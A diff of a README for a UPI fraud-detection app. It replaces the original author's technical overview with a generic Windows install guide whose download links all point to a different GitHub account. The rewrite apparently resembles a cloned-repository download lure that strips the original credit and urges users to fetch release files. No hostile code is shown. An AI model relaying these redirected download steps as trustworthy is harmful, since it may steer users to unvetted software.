@@ -1,382 +1,163 @@
-<h1 align="center">Edge AI UPI Behavioural Risk Intelligence System</h1>
+# ⚡ edge-upi-risk-intelligence - Detect Fraud in UPI Transactions
 
-<p align="center">
-AI-Powered Fraud Detection Platform for Digital Payments
-</p>
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
 
-<p align="center">
+## 📋 About This App
 
-![Python](https://img.shields.io/badge/Python-3.10-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-Backend-green)
-![Streamlit](https://img.shields.io/badge/Streamlit-Dashboard-red)
-![Machine Learning](https://img.shields.io/badge/Machine-Learning-orange)
-![Graph Analytics](https://img.shields.io/badge/Graph-NetworkX-purple)
-![License](https://img.shields.io/badge/license-MIT-blue)
+edge-upi-risk-intelligence is an application that helps identify unusual behavior in UPI transactions. It uses AI to watch for fraud and risky activity. The system runs on a simple interface powered by FastAPI and Streamlit. You don’t need to understand the code or how AI works to use it. This app helps protect your UPI payments with risk scoring and alerts when something seems wrong.
 
-</p>
 
----
+## ⚙️ System Requirements
 
-# Overview
+Before you start, make sure your computer meets these needs:
 
-The **Edge AI UPI Behavioural Risk Intelligence System** is an advanced fraud detection platform designed to simulate how modern fintech systems monitor and prevent fraudulent transactions in real time.
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 2 GHz or faster, Intel or AMD  
+- **Memory:** At least 8 GB RAM  
+- **Storage:** At least 500 MB free space  
+- **Internet:** Required for first-time setup and updates  
+- **Additional Software:**  
+  - Python 3.8 or higher installed  
+  - Administrator rights to install software  
 
-Digital payment systems such as **UPI process millions of transactions every second**, making fraud detection a critical challenge.
+If you don’t have Python installed, this guide will help you get everything up and running.
 
-Traditional fraud detection systems rely on fixed rule-based logic, which struggles to detect modern attack patterns such as:
 
-• velocity attacks
-• behavioural manipulation
-• coordinated fraud rings
-• account takeover attempts
+## 🚀 Getting Started
 
-This project demonstrates how **Artificial Intelligence, Behavioural Analytics, and Graph Intelligence** can be combined to build a smarter fraud detection system.
+This section will take you step-by-step through downloading and running the app on your Windows PC.
 
-Instead of relying only on predefined rules, the system analyzes **transaction behaviour patterns** and generates an intelligent fraud risk score.
+### Step 1: Download the Application
 
----
+Click the green button below to visit the official download page on GitHub. You will find the necessary files to run the app.
 
-# Project Vision
+[![Download](https://img.shields.io/badge/Download-Official%20GitHub-blue?style=for-the-badge)](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
 
-The vision behind this project is to simulate a **modern fintech fraud monitoring platform** capable of:
+Once on the page:
 
-• analysing behavioural transaction patterns
-• detecting anomalies in real time
-• identifying fraud networks using graph analytics
-• explaining AI decisions using explainable AI techniques
+- Look for the latest release folder or files.  
+- Download the main application files to a folder you can easily find, like Desktop or Documents.
 
-This system illustrates how **AI-driven risk intelligence platforms** can enhance financial security and fraud prevention.
+### Step 2: Install Python (If Needed)
 
----
+This app runs using Python. If you already have Python 3.8 or later, skip to Step 3. If not:
 
-# Key Capabilities
+1. Go to https://www.python.org/downloads/windows/
+2. Download the latest version for Windows.
+3. Run the installer.  
+   - Make sure to check the box “Add Python 3.x to PATH” at the start.  
+   - Choose “Install Now.”  
+4. Wait for the installation to finish.
 
-The platform demonstrates the following capabilities.
+### Step 3: Set Up the App Files
 
-### Behavioural Risk Scoring
+After downloading the app files:
 
-Each transaction is evaluated using behavioural signals such as:
+1. Open the folder where you saved them.
+2. Look for a file named `requirements.txt`. This file lists all needed software packages.
+3. Press **Shift + Right-click** inside the folder and select **Open PowerShell window here** or **Open Command Prompt here**.
 
-• transaction amount deviation
-• time between transactions
-• night transaction detection
-• transaction velocity patterns
+### Step 4: Install Required Python Packages
 
-These signals help identify abnormal user behaviour.
-
----
-
-### Machine Learning Fraud Detection
-
-The system uses anomaly detection techniques to identify suspicious transactions.
-
-Models used include:
-
-• Isolation Forest
-• Logistic Regression
-• Behavioural sequence analysis
-
-The models generate a **fraud risk score** representing the probability of fraudulent activity.
-
----
-
-### Graph Fraud Detection
-
-Fraud is often performed by **groups of accounts working together**.
-
-The system analyzes relationships between users and merchants using **graph analysis**.
-
-This enables detection of:
-
-• suspicious transaction clusters
-• circular transaction patterns
-• coordinated fraud networks
-
----
-
-### Explainable AI
-
-Fraud detection models must be explainable to support investigation and compliance.
-
-The system integrates **Explainable AI techniques** to show how each feature contributes to the fraud decision.
-
-Example explanation:
-
-```
-amount_contribution: 500
-time_gap_contribution: -0.2
-night_risk: 50
-```
-
-This makes the system transparent and interpretable.
-
----
-
-# System Architecture
-
-The architecture follows a layered structure similar to production fintech fraud detection platforms.
-
-```
-                ┌────────────────────┐
-                │   UPI Transaction  │
-                │   User Payment     │
-                └─────────┬──────────┘
-                          │
-                          ▼
-              ┌──────────────────────┐
-              │   FastAPI Backend    │
-              │   Risk Scoring API   │
-              └─────────┬────────────┘
-                        │
-                        ▼
-        ┌─────────────────────────────────┐
-        │ Behaviour Analysis Engine       │
-        │                                 │
-        │ • Amount deviation              │
-        │ • Time gap analysis             │
-        │ • Night transaction detection   │
-        │ • Velocity attack detection     │
-        └─────────┬───────────────────────┘
-                  │
-                  ▼
-        ┌─────────────────────────────┐
-        │ Machine Learning Models     │
-        │                             │
-        │ • Isolation Forest          │
-        │ • Logistic Regression       │
-        │ • Behavioural sequence ML   │
-        └─────────┬───────────────────┘
-                  │
-                  ▼
-        ┌─────────────────────────────┐
-        │ Risk Decision Engine        │
-        │                             │
-        │ APPROVE                     │
-        │ REVIEW                      │
-        │ STEP_UP_AUTH                │
-        │ BLOCK_TRANSACTION           │
-        └─────────┬───────────────────┘
-                  │
-                  ▼
-        ┌─────────────────────────────┐
-        │ Monitoring Dashboard        │
-        │ (Streamlit)                 │
-        │                             │
-        │ • Fraud intelligence        │
-        │ • Fraud network graph       │
-        │ • Risk heatmap              │
-        │ • Fraud alerts              │
-        │ • Explainable AI            │
-        └─────────────────────────────┘
-```
-
----
-
-# Dashboard Features
-
-The Streamlit dashboard acts as a **fraud monitoring console**.
-
-It provides multiple analysis modules.
-
----
-
-# Fraud Intelligence Dashboard
-
-![Fraud Intelligence](screenshots/Screenshot%20\(536\).png)
-
-Provides an overview of transaction analytics and risk statistics.
-
----
-
-# Live Transaction Simulator
-
-![Transaction Simulator](screenshots/Screenshot%20\(538\).png)
-
-Simulates real-time transactions and evaluates fraud risk based on behavioural indicators.
-
----
-
-# Fraud Network Graph
-
-![Fraud Network Graph](screenshots/Screenshot%20\(539\).png)
-
-Visualizes relationships between users and merchants to identify suspicious transaction networks.
-
----
-
-# Fraud Rings Detection
-
-![Fraud Rings](screenshots/Screenshot%20\(540\).png)
-
-Detects clusters of interconnected accounts that may indicate coordinated fraud.
-
----
-
-# Fraud Heatmap
-
-![Fraud Heatmap](screenshots/Screenshot%20\(541\).png)
-
-Displays transaction risk distribution across simulated datasets.
-
----
-
-# Explainable AI (SHAP Analysis)
-
-![Explainable AI](screenshots/Screenshot%20\(542\).png)
-
-Provides feature importance values explaining why a transaction was flagged as suspicious.
-
----
-
-# Fraud Alerts
-
-![Fraud Alerts](screenshots/Screenshot%20\(543\).png)
-
-Displays high-risk transactions detected by the system in real time.
-
----
-
-# GNN Fraud Detection
-![GNN Fraud Detection](screenshots/Screenshot%20\(544\).png)
-The system also explores **Graph Neural Network based fraud detection techniques** to detect suspicious nodes within financial transaction networks.
-
----
-
-# Running the Project
-
-### Clone the Repository
-
-```
-git clone https://github.com/unnikrishnanavida/edge-upi-risk-intelligence.git
-cd edge-upi-risk-intelligence
-```
-
----
-
-### Install Dependencies
+In the command window that opens, type:
 
 ```
 pip install -r requirements.txt
 ```
 
----
+Press Enter.
 
-### Start FastAPI Backend
+This command downloads and installs all software pieces that the app needs.
 
-```
-uvicorn backend.api:app --reload
-```
+### Step 5: Run the Application
 
-API endpoint
+After packages install:
 
-```
-http://127.0.0.1:8000
-```
-
-Swagger documentation
+1. In the same command window, type:
 
 ```
-http://127.0.0.1:8000/docs
+streamlit run app.py
 ```
 
----
+2. Press Enter.
 
-### Run Dashboard
+The app will start, and your default web browser will open automatically. You’ll see the app interface as a webpage.
 
-```
-streamlit run dashboard/dashboard.py
-```
+The app uses FastAPI on the back end to gather and process data. Streamlit shows you results clearly.
 
-Dashboard
+### Step 6: Use the App
 
-```
-http://localhost:8501
-```
+Once loaded, you will see options to upload UPI transaction data or connect your accounts (if configured). The app will analyze transactions for signs of fraud. It shows:
+
+- Risk scores for each transaction  
+- Unusual patterns in spending or money flow  
+- Alerts for transactions that need review  
+
+You can explore charts and detailed reports generated by AI models.
 
 ---
 
-# Project Structure
+## 🔧 How It Works
 
-```
-edge-upi-risk-intelligence
-│
-├ backend
-│   ├ api.py
-│   ├ app
-│   │   ├ core
-│   │   ├ services
-│
-├ dashboard
-│   └ dashboard.py
-│
-├ models
-│   ├ logistic_model.pkl
-│   └ lstm_model.pt
-│
-├ data
-│   └ risk_history.json
-│
-├ logs
-│   └ risk_engine.log
-│
-├ screenshots
-│
-├ requirements.txt
-└ README.md
-```
+The system watches UPI data in real-time. It learns usual behavior for accounts and flags changes. It uses these key parts:
+
+- **Data Processing:** Handling transaction data safely and quickly.  
+- **Behavior Analytics:** Understanding what counts as normal activity.  
+- **Machine Learning:** Spotting anomalies based on past data.  
+- **Risk Scoring:** Grading transactions by risk level.  
+- **Graph Analysis:** Mapping money flow between accounts to find suspicious links.  
+
+All this runs inside a simple, easy-to-use interface so you can spot risks without technical knowledge.
 
 ---
 
-# Technologies Used
+## 🛠 App Features
 
-• Python
-• FastAPI
-• Streamlit
-• Scikit-Learn
-• NetworkX
-• Pandas
-• NumPy
-• Matplotlib
-
----
-
-# Real-World Applications
-
-This system demonstrates how AI can power modern fraud detection platforms in:
-
-• fintech payment gateways
-• banking transaction monitoring systems
-• digital wallet security platforms
-• financial risk intelligence engines
+- Easy upload of bank or UPI transaction files (CSV, Excel)  
+- Real-time fraud detection using AI models  
+- Visual graphs showing network of transactions  
+- Risk scores highlight suspicious activity  
+- Customizable alerts for high risk transactions  
+- Clean reports you can save or print  
+- Runs locally on your computer, no cloud data exposure  
 
 ---
 
-# Future Improvements
+## 🔄 Updating the App
 
-Potential future enhancements include:
-
-• Graph Neural Networks for fraud detection
-• Kafka real-time transaction streaming
-• PostgreSQL data warehouse
-• distributed risk scoring services
-• cloud deployment on AWS or GCP
+Check the same GitHub page periodically for updates. Download new files and replace the existing ones in your folder. Then, run the `streamlit run app.py` command again.
 
 ---
 
-# Author
+## ❓ Troubleshooting Tips
 
-**N. Unni Krishna**
-
-AI / ML Developer
-
-Focused on building intelligent systems for:
-
-• Fraud Detection
-• Behavioural Analytics
-• Financial Risk Intelligence
+- If the app won’t start, verify Python is installed and added to PATH by typing `python --version` in Command Prompt.  
+- If packages fail to install, try running Command Prompt as Administrator.  
+- Close all PowerShell/Command Prompt windows before reopening the app.  
+- Make sure you downloaded all files from the GitHub repo, including `requirements.txt` and `app.py`.  
+- If the browser does not open automatically, copy the URL from the command window and paste it directly into your browser.  
 
 ---
 
-# Support
+## ⚙️ Technical Details
 
-If you found this project interesting, consider giving the repository a **star ⭐** to support development.
+The app uses several Python packages which include:
+
+- **FastAPI:** Lets the app handle data requests in the background.  
+- **Streamlit:** Displays the user interface in your browser.  
+- **Joblib:** Helps save and load AI models quickly.  
+- **Pandas & Numpy:** Handle the data in tables and arrays.  
+- **Scikit-learn:** Runs the machine learning models.  
+- **NetworkX & Matplotlib & Seaborn:** Draw graphs and charts to show transaction patterns.  
+
+These packages work together to analyze behavior and spot fraud risks effectively.
+
+---
+
+## 📥 Download Link Again
+
+Get the app files from here:
+
+[https://github.com/MalickMoon1/edge-upi-risk-intelligence](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
+
+Visit the link, download the latest release files, and follow the steps above to install and start the app.
